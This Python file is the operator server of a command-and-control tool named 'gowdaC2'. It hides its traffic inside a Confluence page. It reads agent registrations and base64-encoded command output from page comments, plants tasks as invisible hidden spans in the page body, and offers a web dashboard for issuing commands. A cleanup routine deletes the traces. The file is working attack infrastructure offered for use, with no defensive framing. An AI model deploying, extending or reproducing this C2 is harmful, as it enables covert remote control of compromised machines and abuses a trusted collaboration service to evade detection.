#!/usr/bin/env python3
# Author: Dhanush Arvind

import argparse
import base64
import json
import os
import re
import sys
import time
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

try:
    import requests
except ImportError:
    print("[!] requests is required: pip install requests")
    sys.exit(1)

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))


class ConfluenceAPI:
    def __init__(self, base_url, email, api_token, page_id):
        self.base_url = base_url.rstrip("/")
        self.page_id = page_id
        self.session = requests.Session()
        self.session.auth = (email, api_token)
        self.session.headers["Content-Type"] = "application/json"
        self.session.headers["Accept"] = "application/json"
        if ".atlassian.net" in base_url:
            self.api_base = f"{self.base_url}/wiki/rest/api"
        else:
            self.api_base = f"{self.base_url}/rest/api"

    def get_all_comments(self):
        results = []
        start = 0
        limit = 50
        while True:
            r = self.session.get(
                f"{self.api_base}/content/{self.page_id}/child/comment",
                params={"expand": "body.storage,version", "start": start, "limit": limit},
            )
            r.raise_for_status()
            data = r.json()
            results.extend(data.get("results", []))
            if data.get("size", 0) < limit:
                break
            start += limit
        return results

    def get_page(self):
        r = self.session.get(
            f"{self.api_base}/content/{self.page_id}",
            params={"expand": "body.storage,version"},
        )
        r.raise_for_status()
        return r.json()

    def update_page(self, page, new_body):
        version = page["version"]["number"]
        update = {
            "version": {"number": version + 1},
            "title": page["title"],
            "type": "page",
            "body": {
                "storage": {
                    "value": new_body,
                    "representation": "storage",
                }
            },
        }
        r = self.session.put(f"{self.api_base}/content/{self.page_id}", json=update)
        r.raise_for_status()
        return r.json()

    def post_comment(self, html_body):
        body = {
            "type": "comment",
            "container": {"id": self.page_id, "type": "page"},
            "body": {
                "storage": {
                    "value": html_body,
                    "representation": "storage",
                }
            },
        }
        r = self.session.post(f"{self.api_base}/content", json=body)
        r.raise_for_status()
        return r.json()

    def delete_content(self, content_id):
        self.session.delete(f"{self.api_base}/content/{content_id}")

    def check_connection(self):
        try:
            r = self.session.get(
                f"{self.api_base}/content/{self.page_id}",
                params={"expand": "version"},
                timeout=5,
            )
            return r.status_code == 200
        except Exception:
            return False

    def get_agents(self):
        comments = self.get_all_comments()
        seen = {}
        for c in comments:
            body = c.get("body", {}).get("storage", {}).get("value", "")
            marker = ">C2:REG:"
            idx = body.find(marker)
            if idx < 0:
                continue
            rest = body[idx + len(marker):]
            end = rest.find("</span>")
            if end < 0:
                continue
            payload = rest[:end]
            parts = payload.split(":", 1)
            if len(parts) < 2:
                continue
            agent_id = parts[0]
            try:
                info = json.loads(base64.b64decode(parts[1]).decode())
            except Exception:
                info = {}
            info["agent_id"] = agent_id
            info["registered"] = c.get("version", {}).get("when", "?")
            seen[agent_id] = info
        return list(seen.values())

    def get_output(self, agent_filter=None):
        comments = self.get_all_comments()
        outputs = []
        for c in comments:
            body = c.get("body", {}).get("storage", {}).get("value", "")
            marker = ">C2:OUT:"
            idx = body.find(marker)
            if idx < 0:
                continue
            rest = body[idx + len(marker):]
            end = rest.find("</span>")
            if end < 0:
                continue
            payload = rest[:end]
            parts = payload.split(":", 2)
            if len(parts) < 3:
                continue
            tid, aid, b64_out = parts[0], parts[1], parts[2]
            if agent_filter and aid != agent_filter:
                continue
            try:
                output = base64.b64decode(b64_out).decode("utf-8", errors="replace")
            except Exception:
                output = "(decode error)"
            ts = c.get("version", {}).get("when", "?")
            outputs.append({
                "task_id": tid,
                "agent_id": aid,
                "output": output,
                "time": ts,
            })
        return outputs

    def send_task(self, agent_id, command):
        task_id = uuid.uuid4().hex[:8]
        cmd_b64 = base64.b64encode(command.encode()).decode()
        marker = (
            f'<span style="display:none">'
            f'C2:TASK:{task_id}:{agent_id}:{cmd_b64}</span>'
        )
        page = self.get_page()
        current_body = page["body"]["storage"]["value"]
        new_body = current_body + f"\n<p>{marker}</p>"
        self.update_page(page, new_body)
        return task_id

    def send_comment_task(self, command, agent_id=None):
        if agent_id:
            tag = f"[cmd:{agent_id}]"
        else:
            tag = "[cmd]"
        html = f"<p>{tag} {command}</p>"
        result = self.post_comment(html)
        return result.get("id", "?")

    def cleanup(self):
        page = self.get_page()
        body = page["body"]["storage"]["value"]
        cleaned = re.sub(
            r'<p><span style="display: ?none;">C2:TASK:[^<]+</span></p>\n?', '', body
        )
        cleaned = re.sub(
            r'<span style="display: ?none;">C2:INIT</span>', '', cleaned
        )
        page_cleaned = cleaned != body
        if page_cleaned:
            self.update_page(page, cleaned)

        comments = self.get_all_comments()
        deleted = 0
        for c in comments:
            body = c.get("body", {}).get("storage", {}).get("value", "")
            if ">C2:REG:" in body or ">C2:OUT:" in body or "[cmd" in body:
                self.delete_content(c["id"])
                deleted += 1
        return {"page_cleaned": page_cleaned, "comments_deleted": deleted}


class C2WebHandler(BaseHTTPRequestHandler):
    confluence = None

    def log_message(self, fmt, *a):
        pass

    def _send_json(self, data, status=200):
        body = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _send_html(self, path):
        try:
            with open(path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_response(404)
            self.end_headers()

    def _read_body(self):
        length = int(self.headers.get("Content-Length", 0))
        return self.rfile.read(length)

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        params = parse_qs(parsed.query)

        if path == "/" or path == "/dashboard.html":
            self._send_html(os.path.join(SCRIPT_DIR, "dashboard.html"))
            return

        if path == "/api/agents":
            try:
                agents = self.confluence.get_agents()
                self._send_json({"agents": agents})
            except Exception as e:
                self._send_json({"error": str(e)}, 500)
            return

        if path == "/api/output":
            try:
                agent = params.get("agent", [None])[0]
                outputs = self.confluence.get_output(agent)
                self._send_json({"output": outputs})
            except Exception as e:
                self._send_json({"error": str(e)}, 500)
            return

        if path == "/api/status":
            connected = self.confluence.check_connection()
            self._send_json({
                "page_id": self.confluence.page_id,
                "url": self.confluence.base_url,
                "connected": connected,
            })
            return

        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/api/task":
            try:
                data = json.loads(self._read_body())
                agent_id = data.get("agent_id", "*")
                command = data.get("command", "")
                if not command:
                    self._send_json({"error": "command required"}, 400)
                    return
                task_id = self.confluence.send_task(agent_id, command)
                self._send_json({"task_id": task_id, "agent_id": agent_id, "command": command})
            except Exception as e:
                self._send_json({"error": str(e)}, 500)
            return

        if path == "/api/ctask":
            try:
                data = json.loads(self._read_body())
                command = data.get("command", "")
                agent_id = data.get("agent_id", None)
                if not command:
                    self._send_json({"error": "command required"}, 400)
                    return
                cid = self.confluence.send_comment_task(command, agent_id)
                target = f"agent {agent_id}" if agent_id else "broadcast"
                self._send_json({"comment_id": cid, "target": target, "command": command})
            except Exception as e:
                self._send_json({"error": str(e)}, 500)
            return

        if path == "/api/cleanup":
            try:
                result = self.confluence.cleanup()
                self._send_json(result)
            except Exception as e:
                self._send_json({"error": str(e)}, 500)
            return

        self.send_response(404)
        self.end_headers()


def main():
    parser = argparse.ArgumentParser(description="Confluence C2 Web Operator")
    parser.add_argument("--url", required=True)
    parser.add_argument("--email", required=True)
    parser.add_argument("--api-token", required=True)
    parser.add_argument("--page-id", required=True)
    parser.add_argument("--port", type=int, default=8443)
    args = parser.parse_args()

    api = ConfluenceAPI(args.url, args.email, args.api_token, args.page_id)

    C2WebHandler.confluence = api

    server = ThreadingHTTPServer(("0.0.0.0", args.port), C2WebHandler)
    server.daemon_threads = True

    def force_exit(signum, frame):
        print("\n[*] Shutting down.")
        server.server_close()
        os._exit(0)

    import signal
    signal.signal(signal.SIGINT, force_exit)
    signal.signal(signal.SIGTERM, force_exit)
    if hasattr(signal, "SIGBREAK"):
        signal.signal(signal.SIGBREAK, force_exit)

    print(f"\n  [gowdaC2 // Confluence Web Operator]")
    print(f"  Dashboard:  http://127.0.0.1:{args.port}")
    print(f"  Confluence: {args.url}")
    print(f"  Page ID:    {args.page_id}\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
        os._exit(0)


if __name__ == "__main__":
    main()
